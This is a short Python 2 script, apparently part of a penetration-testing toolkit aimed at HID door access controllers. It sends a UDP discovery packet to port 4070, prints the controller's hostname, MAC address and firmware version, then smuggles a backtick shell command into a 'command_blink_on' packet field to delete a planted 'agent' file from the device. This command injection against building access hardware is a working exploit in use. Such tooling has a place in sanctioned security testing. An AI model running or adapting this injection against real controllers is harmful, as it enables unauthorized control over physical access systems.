#!/usr/bin/env python
#
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

import socket
import argparse

def clean(rhost, rport):
  s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  pkt0 = "discover;013;"
  print "[*] Sending Discovery Packet..."
  s.sendto(pkt0, (rhost, rport))
  rspn = s.recv(1024)
  rmac = rspn.split(";")[2]
  print ""
  print "[+] Response: "+rspn.split(";")[0]
  print "[+] Device Type: "+rspn.split(";")[6]
  print "[+] Hostname: "+rspn.split(";")[3]
  print "[+] Internal IP: "+rspn.split(";")[4]
  print "[+] MAC Address: "+rspn.split(";")[2]
  print "[+] Firmware Version: "+rspn.split(";")[7]
  print "[+] Build Date: "+rspn.split(";")[8]
  print ""
  pkt1 = "command_blink_on;044;"+rmac+";1`rm /tmp/a`;"
  print "[*] Removing agent..."
  s.sendto(pkt1, (rhost, rport))

if __name__ == '__main__':
  parser = argparse.ArgumentParser(usage='./agentclean.py -r 10.0.0.1')
  parser.add_argument('-r', '--rhost', required=True, help='IP of target door controller')
  args = parser.parse_args()
  rhost = args.rhost
  rport = 4070
  print "###############################"
  print "# Conceirge HID Agent Remover #"
  print "###############################"
  print ""
  print "[*] Targeting HID Controller at: "+rhost
  clean(rhost,rport)
  print "[*] Agent removed from: "+rhost
